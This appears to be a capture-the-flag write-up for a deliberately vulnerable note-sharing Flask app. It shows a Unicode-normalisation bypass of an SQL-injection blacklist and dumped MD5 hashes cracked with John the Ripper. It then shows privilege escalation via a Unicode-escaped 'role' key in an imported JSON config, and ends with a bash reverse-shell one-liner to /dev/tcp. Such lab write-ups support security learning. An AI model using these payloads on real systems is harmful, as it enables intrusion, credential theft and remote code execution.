URL : [NoteShare](https://app.hackinghub.io/hubs/snyk-ftf-26-noteshare)
Type: white box
Source: app.py

First thing that caught my attention is this filter function
```
def filter_security_input(tags):
    if not tags:
        return tags
    
    regex = re.compile(
        r"^(?!.*['\";\-#=<>|&])"
        r"(?!.*(/\*|\*/))"
        r"(?!.*(union|select|insert|update|delete|drop|create|alter|exec|execute|where|from|join|order|group|having|limit|offset|into|values|set|table|database|column|index|view|trigger|procedure|function|declare|cast|convert|char|concat|substring|ascii|hex|unhex|sleep|benchmark|waitfor|delay|information_schema|sysobjects|syscolumns))"
        r".+$",
        re.IGNORECASE
    )
    
    if not regex.match(tags):
        return None
    
    normalized = unicodedata.normalize('NFKC', tags)
    
    return normalized
```
So for this function, it will filter out defined character and string and then normalize the input with format (NFKC).

Next, having a look at this endpoint
```
@app.route('/notes/create', methods=['POST'])
def create_note():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    title = request.form.get('title', '')
    content = request.form.get('content', '')
    tags = request.form.get('tags', '')
    shared = 1 if request.form.get('shared') else 0
    
    tags_filtered = filter_security_input(tags) if tags else ''
    
    if tags and not tags_filtered:
        db = get_db()
        notes = db.execute('SELECT * FROM notes WHERE user_id = ? ORDER BY id DESC', 
                          (session['user_id'],)).fetchall()
        return render_template_string(NOTES_TEMPLATE + 
                                     '<script>alert("Security filter: Invalid characters or patterns detected in tags");</script>',
                                     notes=notes,
                                     role=session['role'])
    
    db = get_db()
    db.execute('INSERT INTO notes (user_id, title, content, shared, tags) VALUES (?, ?, ?, ?, ?)',
              (session['user_id'], title, content, shared, tags_filtered))
    
    action = f"Created note: {title}"
    metadata = f"shared={shared}, tags={tags_filtered}"
    db.execute('INSERT INTO logs (user_id, action, metadata) VALUES (?, ?, ?)', 
              (session['user_id'], action, metadata))
    db.commit()
    
    return redirect(url_for('notes'))
```
Basically, this endpoint allows users to create a note with specific fields like `title`, `content` and `tags`. For the `tags`, this field applies the `filter_security_input(tags)` function from above, indicating that I could input something to manipulate the system but not yet.

Moreover, this endpoint also shows me that no sanitization was implemented 
```
@app.route('/shared/<note_id>')
def view_shared_note(note_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if not note_id.isdigit():
        return render_template_string(SHARED_NOTE_TEMPLATE, 
                                     error='Invalid note ID format',
                                     role=session['role'])
    
    db = get_db()
    try:
        note = db.execute('''SELECT notes.id, notes.title, notes.content, notes.tags, users.username as author 
                            FROM notes 
                            JOIN users ON notes.user_id = users.id 
                            WHERE notes.id = ? AND notes.shared = 1''', (note_id,)).fetchone()
        
        if not note:
            return render_template_string(SHARED_NOTE_TEMPLATE,
                                         error='Note not found or not shared',
                                         role=session['role'])
        
        tags = note['tags'] if note['tags'] else ''
        
        db.execute('INSERT INTO logs (user_id, action, metadata) VALUES (?, ?, ?)', 
                  (session['user_id'], f'Viewed shared note: {note["title"]}', f'tags={tags}'))
        db.commit()
        
        view_count = 0
        tag_stats = []
        
        if tags:
            stats_query = f"SELECT action, COUNT(*) as count FROM logs WHERE metadata LIKE '%{tags}%' GROUP BY action"
            try:
                results = db.execute(stats_query).fetchall()
                for row in results:
                    tag_stats.append({
                        'action': row['action'],
                        'count': row['count']
                    })
                view_count = sum([stat['count'] for stat in tag_stats])
            except Exception as sqli_error:
                view_count = 0
                tag_stats = [{'action': f'SQL Error: {str(sqli_error)}', 'count': 0}]
        
        return render_template_string(SHARED_NOTE_TEMPLATE,
                                     note=note,
                                     role=session['role'],
                                     view_count=view_count,
                                     tag_stats=tag_stats)
    except Exception as e:
        return render_template_string(SHARED_NOTE_TEMPLATE,
                                     error=f'Error loading note: {str(e)}',
                                     role=session['role'])
```

This endpoint allows users to view their note with specific `note_id`. However, paying attention to the SQL query 
```
SELECT action, COUNT(*) as count FROM logs WHERE metadata LIKE '%{tags}%' GROUP BY action
```

Again, `tags` is considered to be the payload, since the system inject the input of the `tags` directly to the query without any proper sanitization. Put things together here is the methodology:
1. Incoporating SQL injection along with NFKC encoding scheme to avoid blacklist
2. Accessing the note to view data

My goal is to find other users' credentials, so I must find `username` and `password` from a table of the database. Reference the register endpoint, I could identify the table containing credentials
```
db.execute('INSERT INTO users (username, password, role) VALUES (?, ?, ?)',
                      (username, hashlib.md5(password.encode()).hexdigest(), 'user'))
```
which is `users`

Payload:
```
x ＇ ᵁNION ⓈELECT username ｜｜ ＇:＇ ｜｜ password, id ℱROM users ﹣﹣
```
Reference : [unicode_normalization](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html)

```
admin:f2a33aa44150c42384f9727a917a12c3
editor:7fb8ae11f87742231756ce9e3c10a7d9
test:098f6bcd4621d373cade4e832627b4f6
```
<img width="1163" height="350" alt="Screenshot 2026-05-25 at 1 13 50 pm" src="https://github.com/user-attachments/assets/381e8be3-37c6-4a37-84cd-c9abf940b393" />

It's time to crack the hash by using `John the Ripper` which is a tool for cracking password
```
──(b0xb0x㉿kali)-[~]
└─$ john -w:/usr/share/wordlists/rockyou.txt cred.hash --format=raw-md5
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (Raw-MD5 [MD5 128/128 ASIMD 4x2])
Remaining 2 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovehacking     (editor)     
1g 0:00:00:00 DONE (2026-05-25 13:23) 1.960g/s 28124Kp/s 28124Kc/s 42677KC/s """anokax"..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Login as `editor` give me access to new function which is `Settings`
<img width="1908" height="936" alt="Screenshot 2026-05-26 at 6 23 26 pm" src="https://github.com/user-attachments/assets/1f3c7ecb-e69d-42e1-bc22-35c3abef4fce" />

Having a look at setting function to understand the system. This function caught my attention
```
@app.route('/settings/import', methods=['POST'])
def settings_import():
    if 'user_id' not in session or session['role'] not in ['editor', 'admin']:
        return redirect(url_for('dashboard'))
    
    if 'config_file' not in request.files:
        return render_template_string(SETTINGS_TEMPLATE,
                                     role=session['role'],
                                     profile=session.get('profile', {}),
                                     error='No file uploaded')
    
    file = request.files['config_file']
    
    if file.filename == '':
        return render_template_string(SETTINGS_TEMPLATE,
                                     role=session['role'],
                                     profile=session.get('profile', {}),
                                     error='No file selected')
    
    try:
        content = file.read().decode('utf-8')
        
        dangerous_patterns = ['__class__', '__globals__', '__builtins__', '__init__', 
                              '__dict__', 'role', 'user_id', 'username']
        
        for pattern in dangerous_patterns:
            if pattern in content.lower():
                raise ValueError(f'Potentially dangerous configuration detected: {pattern}')
        
        config_data = json.loads(content)
        
        if not isinstance(config_data, dict):
            raise ValueError('Invalid JSON structure')
        
        if 'profile' in config_data and isinstance(config_data['profile'], dict):
            if 'profile' not in session:
                session['profile'] = {}
            session['profile'].update(config_data['profile'])
        
        for key, value in config_data.items():
            if key == 'profile':
                continue
            
            if key in ['user_id', 'username', '_sa_instance_state']:
                continue
            
            if isinstance(value, dict):
                if key in session and isinstance(session[key], dict):
                    session[key].update(value)
                else:
                    session[key] = value
            elif isinstance(value, (str, int, float, bool, list, type(None))):
                session[key] = value
        
        session.modified = True
        
        db = get_db()
        db.execute('INSERT INTO logs (user_id, action, metadata) VALUES (?, ?, ?)', 
                  (session['user_id'], 'Imported configuration', f'filename={file.filename}'))
        db.commit()
        
        return render_template_string(SETTINGS_TEMPLATE,
                                     role=session['role'],
                                     profile=session.get('profile', {}),
                                     success='Configuration imported successfully')
    except ValueError as ve:
        if 'profile' not in session or not isinstance(session.get('profile'), dict):
            session['profile'] = {}
        return render_template_string(SETTINGS_TEMPLATE,
                                     role=session['role'],
                                     profile=session.get('profile', {}),
                                     error=f'Validation error: {str(ve)}')
    except Exception as e:
        if 'profile' not in session or not isinstance(session.get('profile'), dict):
            session['profile'] = {}
        
        return render_template_string(SETTINGS_TEMPLATE,
                                     role=session['role'],
                                     profile=session.get('profile', {}),
                                     error=f'Import failed: {str(e)}')
```

For the import function allow me to upload a json format file to load new preference for the profile. Constructing the payload requires 3 fields
```
{
  "profile": {
    "bio": "",
    "display_name": "",
    "website": ""
  }
}
```

Reference:
```
@app.route('/settings', methods=['GET'])
def settings():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if session['role'] not in ['editor', 'admin']:
        return redirect(url_for('dashboard'))
    
    if 'profile' not in session:
        session['profile'] = {'display_name': '', 'bio': '', 'website': ''}
    
    return render_template_string(SETTINGS_TEMPLATE,
                                 role=session['role'],
                                 profile=session.get('profile', {}))
```
Furthermore, I want to escalate the privilege of user `editor` to `admin` so I am going to embeded another field `role` to the json file
```
{
  "profile": {
    "bio": "nothing",
    "display_name": "nothing",
    "website": "nothing",
    "role": "admin"
  }
}
```

<img width="1207" height="812" alt="Screenshot 2026-05-26 at 6 39 23 pm" src="https://github.com/user-attachments/assets/80e75c41-f818-4206-a801-d0e20c669005" />
Looking at the source code, special strings or patterns like these below are banned
```
['__class__', '__globals__', '__builtins__', '__init__', 
                              '__dict__', 'role', 'user_id', 'username']
```
However, I just need to encode the string from `role` to unicode `\u0072\u006f\u006C\u0065`
```
{
  "profile": {
    "bio": "nothing",
    "display_name": "nothing",
    "website": "nothing",
    "\u0072\u006f\u006C\u0065": "admin"
  }
}
```

Reference for unicode table : [table](https://symbl.cc/en/unicode-table/#basic-latin)

This works, however, nothing happens and the UI still the same. Probably I need to modify the payload
```
{
  "profile": {
    "bio": "nothing",
    "display_name": "nothing",
    "website": "nothing"
  },
  "\u0072\u006f\u006C\u0065": "admin"
}

This one gives me a new function which is `Admin` and also escalates me straight to `Admin`.
My goal is to land a reverse shell, here is the payload
```
#!/bin/bash
bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
```
Then using base64 to encode it

